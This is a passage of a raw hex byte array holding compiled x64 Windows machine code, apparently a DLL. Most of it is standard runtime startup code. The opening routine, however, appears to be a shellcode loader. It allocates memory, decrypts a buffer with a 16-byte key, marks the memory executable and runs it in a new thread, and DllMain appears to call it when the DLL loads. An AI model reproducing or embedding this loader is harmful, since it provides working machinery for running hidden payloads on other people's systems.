0x0, 0x8b, 0x44, 0x24, 0x30, 0x41, 0xb9, 0x4, 0x0, 0x0, 0x0, 0x41, 0xb8, 0x0, 0x30, 0x0, 0x0, 0x8b, 0xd0, 0x33, 0xc9, 0xff, 0x15, 0xfa, 0xde, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x40, 0x41, 0xb9, 0x10, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x5, 0xb0, 0x7f, 0x1, 0x0, 0x8b, 0x54, 0x24, 0x30, 0x48, 0x8d, 0xd, 0x85, 0x7e, 0x1, 0x0, 0xe8, 0x80, 0xfe, 0xff, 0xff, 0x8b, 0x44, 0x24, 0x30, 0x44, 0x8b, 0xc0, 0x48, 0x8d, 0x15, 0x72, 0x7e, 0x1, 0x0, 0x48, 0x8b, 0x4c, 0x24, 0x40, 0xe8, 0xf8, 0xb, 0x0, 0x0, 0x8b, 0x44, 0x24, 0x30, 0x4c, 0x8d, 0x4c, 0x24, 0x34, 0x41, 0xb8, 0x20, 0x0, 0x0, 0x0, 0x8b, 0xd0, 0x48, 0x8b, 0x4c, 0x24, 0x40, 0xff, 0x15, 0xac, 0xde, 0x0, 0x0, 0x89, 0x44, 0x24, 0x38, 0x83, 0x7c, 0x24, 0x38, 0x0, 0x74, 0x38, 0x48, 0xc7, 0x44, 0x24, 0x28, 0x0, 0x0, 0x0, 0x0, 0xc7, 0x44, 0x24, 0x20, 0x0, 0x0, 0x0, 0x0, 0x45, 0x33, 0xc9, 0x4c, 0x8b, 0x44, 0x24, 0x40, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0x15, 0x6e, 0xde, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x48, 0xba, 0xff, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x4c, 0x24, 0x48, 0xff, 0x15, 0x51, 0xde, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x4c, 0x89, 0x44, 0x24, 0x18, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4c, 0x24, 0x8, 0x48, 0x83, 0xec, 0x38, 0x8b, 0x44, 0x24, 0x48, 0x89, 0x44, 0x24, 0x20, 0x83, 0x7c, 0x24, 0x20, 0x1, 0x74, 0x2, 0xeb, 0x5, 0xe8, 0xf8, 0xfe, 0xff, 0xff, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x38, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x85, 0xd2, 0x74, 0x39, 0x83, 0xea, 0x1, 0x74, 0x28, 0x83, 0xea, 0x1, 0x74, 0x16, 0x83, 0xfa, 0x1, 0x74, 0xa, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xe8, 0xde, 0x4, 0x0, 0x0, 0xeb, 0x5, 0xe8, 0xaf, 0x4, 0x0, 0x0, 0xf, 0xb6, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x49, 0x8b, 0xd0, 0x48, 0x83, 0xc4, 0x28, 0xe9, 0xf, 0x0, 0x0, 0x0, 0x4d, 0x85, 0xc0, 0xf, 0x95, 0xc1, 0x48, 0x83, 0xc4, 0x28, 0xe9, 0x18, 0x1, 0x0, 0x0, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf2, 0x4c, 0x8b, 0xf1, 0x33, 0xc9, 0xe8, 0x4e, 0x5, 0x0, 0x0, 0x84, 0xc0, 0xf, 0x84, 0xc8, 0x0, 0x0, 0x0, 0xe8, 0xd5, 0x3, 0x0, 0x0, 0x8a, 0xd8, 0x88, 0x44, 0x24, 0x40, 0x40, 0xb7, 0x1, 0x83, 0x3d, 0xed, 0x88, 0x1, 0x0, 0x0, 0xf, 0x85, 0xc5, 0x0, 0x0, 0x0, 0xc7, 0x5, 0xdd, 0x88, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0xe8, 0x20, 0x4, 0x0, 0x0, 0x84, 0xc0, 0x74, 0x4f, 0xe8, 0x2f, 0x8, 0x0, 0x0, 0xe8, 0x5a, 0x3, 0x0, 0x0, 0xe8, 0x81, 0x3, 0x0, 0x0, 0x48, 0x8d, 0x15, 0x6, 0xe0, 0x0, 0x0, 0x48, 0x8d, 0xd, 0xdf, 0xdf, 0x0, 0x0, 0xe8, 0xd6, 0x3a, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x29, 0xe8, 0xbd, 0x3, 0x0, 0x0, 0x84, 0xc0, 0x74, 0x20, 0x48, 0x8d, 0x15, 0xbe, 0xdf, 0x0, 0x0, 0x48, 0x8d, 0xd, 0xaf, 0xdf, 0x0, 0x0, 0xe8, 0x72, 0x3a, 0x0, 0x0, 0xc7, 0x5, 0x88, 0x88, 0x1, 0x0, 0x2, 0x0, 0x0, 0x0, 0x40, 0x32, 0xff, 0x8a, 0xcb, 0xe8, 0x32, 0x6, 0x0, 0x0, 0x40, 0x84, 0xff, 0x75, 0x3f, 0xe8, 0x78, 0x6, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x83, 0x38, 0x0, 0x74, 0x24, 0x48, 0x8b, 0xc8, 0xe8, 0x7f, 0x5, 0x0, 0x0, 0x84, 0xc0, 0x74, 0x18, 0x4c, 0x8b, 0xc6, 0xba, 0x2, 0x0, 0x0, 0x0, 0x49, 0x8b, 0xce, 0x48, 0x8b, 0x3, 0x4c, 0x8b, 0xd, 0x4a, 0xdf, 0x0, 0x0, 0x41, 0xff, 0xd1, 0xff, 0x5, 0x11, 0x88, 0x1, 0x0, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x8b, 0x7c, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3, 0xb9, 0x7, 0x0, 0x0, 0x0, 0xe8, 0x2c, 0x6, 0x0, 0x0, 0x90, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x30, 0x40, 0x8a, 0xf9, 0x8b, 0x5, 0xd1, 0x87, 0x1, 0x0, 0x85, 0xc0, 0x7f, 0xd, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x30, 0x5f, 0xc3, 0xff, 0xc8, 0x89, 0x5, 0xb8, 0x87, 0x1, 0x0, 0xe8, 0xbb, 0x2, 0x0, 0x0, 0x8a, 0xd8, 0x88, 0x44, 0x24, 0x20, 0x83, 0x3d, 0xd6, 0x87, 0x1, 0x0, 0x2, 0x75, 0x37, 0xe8, 0xcf, 0x3, 0x0, 0x0, 0xe8, 0x6a, 0x2, 0x0, 0x0, 0xe8, 0x61, 0x7, 0x0, 0x0, 0x83, 0x25, 0xbe, 0x87, 0x1, 0x0, 0x0, 0x8a, 0xcb, 0xe8, 0x6b, 0x5, 0x0, 0x0, 0x33, 0xd2, 0x40, 0x8a, 0xcf, 0xe8, 0x85, 0x5, 0x0, 0x0, 0xf6, 0xd8, 0x1b, 0xdb, 0x83, 0xe3, 0x1, 0xe8, 0xd1, 0x3, 0x0, 0x0, 0x8b, 0xc3, 0xeb, 0xa2, 0xb9, 0x7, 0x0, 0x0, 0x0, 0xe8, 0xa7, 0x5, 0x0, 0x0, 0x90, 0x90, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x20, 0x4c, 0x89, 0x40, 0x18, 0x89, 0x50, 0x10, 0x48, 0x89, 0x48, 0x8, 0x56, 0x57, 0x41, 0x56, 0x48, 0x83, 0xec, 0x40, 0x49, 0x8b, 0xf0, 0x8b, 0xfa, 0x4c, 0x8b, 0xf1, 0x85, 0xd2, 0x75, 0xf, 0x39, 0x15, 0x34, 0x87, 0x1, 0x0, 0x7f, 0x7, 0x33, 0xc0, 0xe9, 0xee, 0x0, 0x0, 0x0, 0x8d, 0x42, 0xff, 0x83, 0xf8, 0x1, 0x77, 0x45, 0x48, 0x8b, 0x5, 0xdc, 0xde, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x75, 0xa, 0xc7, 0x44, 0x24, 0x30, 0x1, 0x0, 0x0, 0x0, 0xeb, 0x14, 0xff, 0x15, 0x37, 0xde, 0x0, 0x0, 0x8b, 0xd8, 0x89, 0x44, 0x24, 0x30, 0x85, 0xc0, 0xf, 0x84, 0xb2, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xc6, 0x8b, 0xd7, 0x49, 0x8b, 0xce, 0xe8, 0xa0, 0xfd, 0xff, 0xff, 0x8b, 0xd8, 0x89, 0x44, 0x24, 0x30, 0x85, 0xc0, 0xf, 0x84, 0x97, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xc6, 0x8b, 0xd7, 0x49, 0x8b, 0xce, 0xe8, 0x51, 0xfd, 0xff, 0xff, 0x8b, 0xd8, 0x89, 0x44, 0x24, 0x30, 0x83, 0xff, 0x1, 0x75, 0x36, 0x85, 0xc0, 0x75, 0x32, 0x4c, 0x8b, 0xc6, 0x33, 0xd2, 0x49, 0x8b, 0xce, 0xe8, 0x35, 0xfd, 0xff, 0xff, 0x48, 0x85, 0xf6, 0xf, 0x95, 0xc1, 0xe8, 0xc6, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0x5, 0x63, 0xde, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0xe, 0x4c, 0x8b, 0xc6, 0x33, 0xd2, 0x49, 0x8b, 0xce, 0xff, 0x15, 0xc0, 0xdd, 0x0, 0x0, 0x85, 0xff, 0x74, 0x5, 0x83, 0xff, 0x3, 0x75, 0x40, 0x4c, 0x8b, 0xc6, 0x8b, 0xd7, 0x49, 0x8b, 0xce, 0xe8, 0x2e, 0xfd, 0xff, 0xff, 0x8b, 0xd8, 0x89, 0x44, 0x24, 0x30, 0x85, 0xc0, 0x74, 0x29, 0x48, 0x8b, 0x5, 0x29, 0xde, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x75, 0x9, 0x8d, 0x58, 0x1, 0x89, 0x5c, 0x24, 0x30, 0xeb, 0x14, 0x4c, 0x8b, 0xc6, 0x8b, 0xd7, 0x49, 0x8b, 0xce, 0xff, 0x15, 0x7d, 0xdd, 0x0, 0x0, 0x8b, 0xd8, 0x89, 0x44, 0x24, 0x30, 0xeb, 0x6, 0x33, 0xdb, 0x89, 0x5c, 0x24, 0x30, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x78, 0x48, 0x83, 0xc4, 0x40, 0x41, 0x5e, 0x5f, 0x5e, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xf8, 0x8b, 0xda, 0x48, 0x8b, 0xf1, 0x83, 0xfa, 0x1, 0x75, 0x5, 0xe8, 0x1f, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xc7, 0x8b, 0xd3, 0x48, 0x8b, 0xce, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xe9, 0x8f, 0xfe, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x20, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x5, 0x88, 0x7b, 0x1, 0x0, 0x48, 0xbb, 0x32, 0xa2, 0xdf, 0x2d, 0x99, 0x2b, 0x0, 0x0, 0x48, 0x3b, 0xc3, 0x75, 0x74, 0x48, 0x83, 0x65, 0x18, 0x0, 0x48, 0x8d, 0x4d, 0x18, 0xff, 0x15, 0xaa, 0xda, 0x0, 0x0, 0x48, 0x8b, 0x45, 0x18, 0x48, 0x89, 0x45, 0x10, 0xff, 0x15, 0x94, 0xda, 0x0, 0x0, 0x8b, 0xc0, 0x48, 0x31, 0x45, 0x10, 0xff, 0x15, 0x80, 0xda, 0x0, 0x0, 0x8b, 0xc0, 0x48, 0x8d, 0x4d, 0x20, 0x48, 0x31, 0x45, 0x10, 0xff, 0x15, 0x68, 0xda, 0x0, 0x0, 0x8b, 0x45, 0x20, 0x48, 0x8d, 0x4d, 0x10, 0x48, 0xc1, 0xe0, 0x20, 0x48, 0x33, 0x45, 0x20, 0x48, 0x33, 0x45, 0x10, 0x48, 0x33, 0xc1, 0x48, 0xb9, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x0, 0x0, 0x48, 0x23, 0xc1, 0x48, 0xb9, 0x33, 0xa2, 0xdf, 0x2d, 0x99, 0x2b, 0x0, 0x0, 0x48, 0x3b, 0xc3, 0x48, 0xf, 0x44, 0xc1, 0x48, 0x89, 0x5, 0x5, 0x7b, 0x1, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x48, 0x48, 0xf7, 0xd0, 0x48, 0x89, 0x5, 0xee, 0x7a, 0x1, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0x48, 0x8d, 0xd, 0x49, 0x85, 0x1, 0x0, 0x48, 0xff, 0x25, 0x2a, 0xda, 0x0, 0x0, 0xcc, 0xcc, 0x48, 0x8d, 0xd, 0x39, 0x85, 0x1, 0x0, 0xe9, 0xd0, 0xf, 0x0, 0x0, 0x48, 0x8d, 0x5, 0x3d, 0x85, 0x1, 0x0, 0xc3, 0x48, 0x8d, 0x5, 0x3d, 0x85, 0x1, 0x0, 0xc3, 0x48, 0x83, 0xec, 0x28, 0xe8, 0xe7, 0xff, 0xff, 0xff, 0x48, 0x83, 0x8, 0x24, 0xe8, 0xe6, 0xff, 0xff, 0xff, 0x48, 0x83, 0x8, 0x2, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0xa7, 0x6, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x21, 0x65, 0x48, 0x8b, 0x4, 0x25, 0x30, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x48, 0x8, 0xeb, 0x5, 0x48, 0x3b, 0xc8, 0x74, 0x14, 0x33, 0xc0, 0xf0, 0x48, 0xf, 0xb1, 0xd, 0x4, 0x85, 0x1, 0x0, 0x75, 0xee, 0x32, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xb0, 0x1, 0xeb, 0xf7, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x6b, 0x6, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x7, 0xe8, 0xb6, 0x4, 0x0, 0x0, 0xeb, 0x19, 0xe8, 0x53, 0x6, 0x0, 0x0, 0x8b, 0xc8, 0xe8, 0xbc, 0x3d, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x4, 0x32, 0xc0, 0xeb, 0x7, 0xe8, 0x7b, 0x41, 0x0, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0xec, 0x28, 0x33, 0xc9, 0xe8, 0x3d, 0x1, 0x0, 0x0, 0x84, 0xc0, 0xf, 0x95, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x67, 0xf, 0x0, 0x0, 0x84, 0xc0, 0x75, 0x4, 0x32, 0xc0, 0xeb, 0x12, 0xe8, 0x5a, 0x44, 0x0, 0x0, 0x84, 0xc0, 0x75, 0x7, 0xe8, 0x65, 0xf, 0x0, 0x0, 0xeb, 0xec, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x53, 0x44, 0x0, 0x0, 0xe8, 0x4e, 0xf, 0x0, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xf9, 0x49, 0x8b, 0xf0, 0x8b, 0xda, 0x48, 0x8b, 0xe9, 0xe8, 0xc4, 0x5, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x16, 0x83, 0xfb, 0x1, 0x75, 0x11, 0x4c, 0x8b, 0xc6, 0x33, 0xd2, 0x48, 0x8b, 0xcd, 0x48, 0x8b, 0xc7, 0xff, 0x15, 0x22, 0xdb, 0x0, 0x0, 0x48, 0x8b, 0x54, 0x24, 0x58, 0x8b, 0x4c, 0x24, 0x50, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xe9, 0x6c, 0x36, 0x0, 0x0, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x7f, 0x5, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x10, 0x48, 0x8d, 0xd, 0x4, 0x84, 0x1, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xe9, 0x3, 0x42, 0x0, 0x0, 0xe8, 0xa6, 0x3a, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x5, 0xe8, 0x81, 0x3a, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0xec, 0x28, 0x33, 0xc9, 0xe8, 0xf1, 0x43, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xe9, 0xd0, 0xe, 0x0, 0x0, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0xf, 0xb6, 0x5, 0xbf, 0x83, 0x1, 0x0, 0x85, 0xc9, 0xbb, 0x1, 0x0, 0x0, 0x0, 0xf, 0x44, 0xc3, 0x88, 0x5, 0xaf, 0x83, 0x1, 0x0, 0xe8, 0x76, 0x3, 0x0, 0x0, 0xe8, 0x3d, 0xe, 0x0, 0x0, 0x84, 0xc0, 0x75, 0x4, 0x32, 0xc0, 0xeb, 0x14, 0xe8, 0x44, 0x43, 0x0, 0x0, 0x84, 0xc0, 0x75, 0x9, 0x33, 0xc9, 0xe8, 0x75, 0xe, 0x0, 0x0, 0xeb, 0xea, 0x8a, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x80, 0x3d, 0x74, 0x83, 0x1, 0x0, 0x0, 0x8b, 0xd9, 0x75, 0x67, 0x83, 0xf9, 0x1, 0x77, 0x6a, 0xe8, 0xdd, 0x4, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x28, 0x85, 0xdb, 0x75, 0x24, 0x48, 0x8d, 0xd, 0x5e, 0x83, 0x1, 0x0, 0xe8, 0xa5, 0x41, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x10, 0x48, 0x8d, 0xd, 0x66, 0x83, 0x1, 0x0, 0xe8, 0x95, 0x41, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x2e, 0x32, 0xc0, 0xeb, 0x33, 0x66, 0xf, 0x6f, 0x5, 0xc1, 0xda, 0x0, 0x0, 0x48, 0x83, 0xc8, 0xff, 0xf3, 0xf, 0x7f, 0x5, 0x2d, 0x83, 0x1, 0x0, 0x48, 0x89, 0x5, 0x36, 0x83, 0x1, 0x0, 0xf3, 0xf, 0x7f, 0x5, 0x36, 0x83, 0x1, 0x0, 0x48, 0x89, 0x5, 0x3f, 0x83, 0x1, 0x0, 0xc6, 0x5, 0x9, 0x83, 0x1, 0x0, 0x1, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xb9, 0x5, 0x0, 0x0, 0x0, 0xe8, 0xfa, 0x0, 0x0, 0x0, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x18, 0x4c, 0x8b, 0xc1, 0xb8, 0x4d, 0x5a, 0x0, 0x0, 0x66, 0x39, 0x5, 0x11, 0xe7, 0xff, 0xff, 0x75, 0x78, 0x48, 0x63, 0xd, 0x44, 0xe7, 0xff, 0xff, 0x48, 0x8d, 0x15, 0x1, 0xe7, 0xff, 0xff, 0x48, 0x3, 0xca, 0x81, 0x39, 0x50, 0x45, 0x0, 0x0, 0x75, 0x5f, 0xb8, 0xb, 0x2, 0x0, 0x0, 0x66, 0x39, 0x41, 0x18, 0x75, 0x54, 0x4c, 0x2b, 0xc2, 0xf, 0xb7, 0x41, 0x14, 0x48, 0x8d, 0x51, 0x18, 0x48, 0x3, 0xd0, 0xf, 0xb7, 0x41, 0x6, 0x48, 0x8d, 0xc, 0x80, 0x4c, 0x8d, 0xc, 0xca, 0x48, 0x89, 0x14, 0x24, 0x49, 0x3b, 0xd1, 0x74, 0x18, 0x8b, 0x4a, 0xc, 0x4c, 0x3b, 0xc1, 0x72, 0xa, 0x8b, 0x42, 0x8, 0x3, 0xc1, 0x4c, 0x3b, 0xc0, 0x72, 0x8, 0x48, 0x83, 0xc2, 0x28, 0xeb, 0xdf, 0x33, 0xd2, 0x48, 0x85, 0xd2, 0x75, 0x4, 0x32, 0xc0, 0xeb, 0x14, 0x83, 0x7a, 0x24, 0x0, 0x7d, 0x4, 0x32, 0xc0, 0xeb, 0xa, 0xb0, 0x1, 0xeb, 0x6, 0x32, 0xc0, 0xeb, 0x2, 0x32, 0xc0, 0x48, 0x83, 0xc4, 0x18, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x8a, 0xd9, 0xe8, 0xc7, 0x3, 0x0, 0x0, 0x33, 0xd2, 0x85, 0xc0, 0x74, 0xb, 0x84, 0xdb, 0x75, 0x7, 0x48, 0x87, 0x15, 0x36, 0x82, 0x1, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x80, 0x3d, 0x2b, 0x82, 0x1, 0x0, 0x0, 0x8a, 0xd9, 0x74, 0x4, 0x84, 0xd2, 0x75, 0xc, 0xe8, 0x2, 0x42, 0x0, 0x0, 0x8a, 0xcb, 0xe8, 0xff, 0xc, 0x0, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8d, 0x5, 0x6d, 0x93, 0x1, 0x0, 0xc3, 0x83, 0x25, 0x35, 0x82, 0x1, 0x0, 0x0, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x55, 0x48, 0x8d, 0xac, 0x24, 0x40, 0xfb, 0xff, 0xff, 0x48, 0x81, 0xec, 0xc0, 0x5, 0x0, 0x0, 0x8b, 0xd9, 0xb9, 0x17, 0x0, 0x0, 0x0, 0xff, 0x15, 0xd2, 0xd6, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x4, 0x8b, 0xcb, 0xcd, 0x29, 0xb9, 0x3, 0x0, 0x0, 0x0, 0xe8, 0xc4, 0xff, 0xff, 0xff, 0x33, 0xd2, 0x48, 0x8d, 0x4d, 0xf0, 0x41, 0xb8, 0xd0, 0x4, 0x0, 0x0, 0xe8, 0x37, 0xe, 0x0, 0x0, 0x48, 0x8d, 0x4d, 0xf0, 0xff, 0x15, 0x6d, 0xd6, 0x0, 0x0, 0x48, 0x8b, 0x9d, 0xe8, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x95, 0xd8, 0x4, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0x45, 0x33, 0xc0, 0xff, 0x15, 0x5b, 0xd6, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x3c, 0x48, 0x83, 0x64, 0x24, 0x38, 0x0, 0x48, 0x8d, 0x8d, 0xe0, 0x4, 0x0, 0x0, 0x48, 0x8b, 0x95, 0xd8, 0x4, 0x0, 0x0, 0x4c, 0x8b, 0xc8, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x4c, 0x8b, 0xc3, 0x48, 0x8d, 0x8d, 0xe8, 0x4, 0x0, 0x0, 0x48, 0x89, 0x4c, 0x24, 0x28, 0x48, 0x8d, 0x4d, 0xf0, 0x48, 0x89, 0x4c, 0x24, 0x20, 0x33, 0xc9, 0xff, 0x15, 0x22, 0xd6, 0x0, 0x0, 0x48, 0x8b, 0x85, 0xc8, 0x4, 0x0, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x50, 0x48, 0x89, 0x85, 0xe8, 0x0, 0x0, 0x0, 0x33, 0xd2, 0x48, 0x8d, 0x85, 0xc8, 0x4, 0x0, 0x0, 0x41, 0xb8, 0x98, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc0, 0x8, 0x48, 0x89, 0x85, 0x88, 0x0, 0x0, 0x0, 0xe8, 0xa0, 0xd, 0x0, 0x0, 0x48, 0x8b, 0x85, 0xc8, 0x4, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x60, 0xc7, 0x44, 0x24, 0x50, 0x15, 0x0, 0x0, 0x40, 0xc7, 0x44, 0x24, 0x54, 0x1, 0x0, 0x0, 0x0, 0xff, 0x15, 0xd6, 0xd5, 0x0, 0x0, 0x83, 0xf8, 0x1, 0x48, 0x8d, 0x44, 0x24, 0x50, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8d, 0x45, 0xf0, 0xf, 0x94, 0xc3, 0x48, 0x89, 0x44, 0x24, 0x48, 0x33, 0xc9, 0xff, 0x15, 0xc5, 0xd5, 0x0, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x40, 0xff, 0x15, 0xb2, 0xd5, 0x0, 0x0, 0x85, 0xc0, 0x75, 0xc, 0x84, 0xdb, 0x75, 0x8, 0x8d, 0x48, 0x3, 0xe8, 0xbe, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0x9c, 0x24, 0xd0, 0x5, 0x0, 0x0, 0x48, 0x81, 0xc4, 0xc0, 0x5, 0x0, 0x0, 0x5d, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x1d, 0xaf, 0x52, 0x1, 0x0, 0x48, 0x8d, 0x3d, 0xa8, 0x52, 0x1, 0x0, 0xeb, 0x12, 0x48, 0x8b, 0x3, 0x48, 0x85, 0xc0, 0x74, 0x6, 0xff, 0x15, 0x78, 0xd7, 0x0, 0x0, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x3b, 0xdf, 0x72, 0xe9, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x1d, 0x83, 0x52, 0x1, 0x0, 0x48, 0x8d, 0x3d, 0x7c, 0x52, 0x1, 0x0, 0xeb, 0x12, 0x48, 0x8b, 0x3, 0x48, 0x85, 0xc0, 0x74, 0x6, 0xff, 0x15, 0x3c, 0xd7, 0x0, 0x0, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x3b, 0xdf, 0x72, 0xe9, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xc2, 0x0, 0x0, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x10, 0x33, 0xc0, 0x33, 0xc9, 0xf, 0xa2, 0x44, 0x8b, 0xc1, 0x45, 0x33, 0xdb, 0x44, 0x8b, 0xcb, 0x41, 0x81, 0xf0, 0x6e, 0x74, 0x65, 0x6c, 0x41, 0x81, 0xf1, 0x47, 0x65, 0x6e, 0x75, 0x44, 0x8b, 0xd2, 0x8b, 0xf0, 0x33, 0xc9, 0x41, 0x8d, 0x43, 0x1, 0x45, 0xb, 0xc8, 0xf, 0xa2, 0x41, 0x81, 0xf2, 0x69, 0x6e, 0x65, 0x49, 0x89, 0x4, 0x24, 0x45, 0xb, 0xca, 0x89, 0x5c, 0x24, 0x4, 0x8b, 0xf9, 0x89, 0x4c, 0x24, 0x8, 0x89, 0x54, 0x24, 0xc, 0x75, 0x50, 0x48, 0x83, 0xd, 0x53, 0x75, 0x1, 0x0, 0xff, 0x25, 0xf0, 0x3f, 0xff, 0xf, 0x3d, 0xc0, 0x6, 0x1, 0x0, 0x74, 0x28, 0x3d, 0x60, 0x6, 0x2, 0x0, 0x74, 0x21, 0x3d, 0x70, 0x6, 0x2, 0x0, 0x74, 0x1a, 0x5, 0xb0, 0xf9, 0xfc, 0xff, 0x83, 0xf8, 0x20, 0x77, 0x24, 0x48, 0xb9, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x48, 0xf, 0xa3, 0xc1, 0x73, 0x14, 0x44, 0x8b, 0x5, 0xe0, 0x7f, 0x1, 0x0, 0x41, 0x83, 0xc8, 0x1, 0x44, 0x89, 0x5, 0xd5, 0x7f, 0x1, 0x0, 0xeb, 